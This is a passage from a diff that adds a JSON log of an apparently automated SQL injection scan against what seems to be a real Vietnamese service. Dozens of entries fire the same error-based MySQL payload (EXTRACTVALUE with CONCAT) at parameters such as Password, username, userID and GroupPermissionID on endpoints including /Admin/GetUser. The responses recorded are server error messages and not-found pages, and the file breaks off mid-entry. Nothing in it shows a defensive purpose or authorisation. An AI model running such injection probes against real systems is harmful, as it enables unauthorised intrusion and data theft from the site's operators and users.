+      "endpoint": "/Handle/SearchPWDByEMSVMapsSearch",
+      "param": "customerID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:39\",\"Signature\":null}",
+      "elapsed": 14.905255317687988
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "search",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:39\",\"Signature\":null}",
+      "elapsed": 6.935908079147339
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByEMSVMapsSearch",
+      "param": "Email",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:39\",\"Signature\":null}",
+      "elapsed": 13.37742829322815
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "Id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:41\",\"Signature\":null}",
+      "elapsed": 12.576511144638062
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "phone",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:42\",\"Signature\":null}",
+      "elapsed": 6.940032243728638
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:42\",\"Signature\":null}",
+      "elapsed": 14.549396276473999
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "ProvinceID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:45\",\"Signature\":null}",
+      "elapsed": 6.455351114273071
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "ID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:46\",\"Signature\":null}",
+      "elapsed": 5.5102410316467285
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "WareHouseID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:47\",\"Signature\":null}",
+      "elapsed": 8.495784044265747
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "Password",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:48\",\"Signature\":null}",
+      "elapsed": 11.663889169692993
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "uid",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:49\",\"Signature\":null}",
+      "elapsed": 8.595540046691895
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "customer_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:49\",\"Signature\":null}",
+      "elapsed": 6.378106117248535
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "Type",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:50\",\"Signature\":null}",
+      "elapsed": 12.556954383850098
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:50\",\"Signature\":null}",
+      "elapsed": 9.926535844802856
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "user",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:51\",\"Signature\":null}",
+      "elapsed": 10.714183807373047
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "userID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:51\",\"Signature\":null}",
+      "elapsed": 8.917100429534912
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "search",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:51\",\"Signature\":null}",
+      "elapsed": 6.897159814834595
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "Id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:52\",\"Signature\":null}",
+      "elapsed": 10.419109106063843
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "keyword",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:52\",\"Signature\":null}",
+      "elapsed": 6.884933948516846
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "username",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:52\",\"Signature\":null}",
+      "elapsed": 12.610942125320435
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "Password",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:53\",\"Signature\":null}",
+      "elapsed": 4.347477674484253
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "email",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:54\",\"Signature\":null}",
+      "elapsed": 7.877182245254517
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "ID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:54\",\"Signature\":null}",
+      "elapsed": 12.972640752792358
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "search",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:54\",\"Signature\":null}",
+      "elapsed": 9.942936897277832
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "Email",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:55\",\"Signature\":null}",
+      "elapsed": 6.901096343994141
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "Type",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:55\",\"Signature\":null}",
+      "elapsed": 6.3444578647613525
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "DistrictID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:55\",\"Signature\":null}",
+      "elapsed": 6.043126344680786
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "mobile",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:56\",\"Signature\":null}",
+      "elapsed": 9.401587009429932
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "username",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:56\",\"Signature\":null}",
+      "elapsed": 5.36037802696228
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "email",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:56\",\"Signature\":null}",
+      "elapsed": 10.394314289093018
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "WareHouseID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:57\",\"Signature\":null}",
+      "elapsed": 6.846527099609375
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "MobileNumber",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:57\",\"Signature\":null}",
+      "elapsed": 9.931541204452515
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "user",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:58\",\"Signature\":null}",
+      "elapsed": 7.037990570068359
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "DistrictID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:58\",\"Signature\":null}",
+      "elapsed": 9.415712356567383
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/api/user",
+      "param": "Password",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 6.276942014694214
+    },
+    {
+      "method": "POST",
+      "endpoint": "/api/user",
+      "param": "username",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 6.776875972747803
+    },
+    {
+      "method": "POST",
+      "endpoint": "/api/user",
+      "param": "name",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 9.842309713363647
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Admin/GetUser",
+      "param": "userID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 5.794435501098633
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Admin/GetUser",
+      "param": "userId",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 6.312429904937744
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/api/user",
+      "param": "userID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 13.900744438171387
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/api/users",
+      "param": "username",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 8.348244190216064
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Admin/GetUserInfo",
+      "param": "user",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 5.245083808898926
+    },
+    {
+      "method": "POST",
+      "endpoint": "/api/users",
+      "param": "username",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 9.384740829467773
+    },
+    {
+      "method": "GET",
+      "endpoint": "/api/user",
+      "param": "username",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 13.406185626983643
+    },
+    {
+      "method": "POST",
+      "endpoint": "/api/users",
+      "param": "MobileNumber",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 11.396190404891968
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/api/user",
+      "param": "GroupPermissionID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }\r\n         @media screen and (max-width: 6",
+      "elapsed": 14.427286624908447
+    },
+    {
+      "method": "GET",
+      "endpoint": "/api/user",
+      "param": "GroupPermissionID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color:red }\r\n         H2 { font-family:\"Verdana\";font-weight:normal;font-size:14pt;color:maroon }\r\n         pre {font-family:\"Consolas\",\"Lucida Console\",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}\r\n         .marker {font-weight: bold; color: black;text-decoration: none;}\r\n         .version {color: gray;}\r\n         .error {margin-bottom: 10px;}\r\n         .expandable { text-decoration:underline; 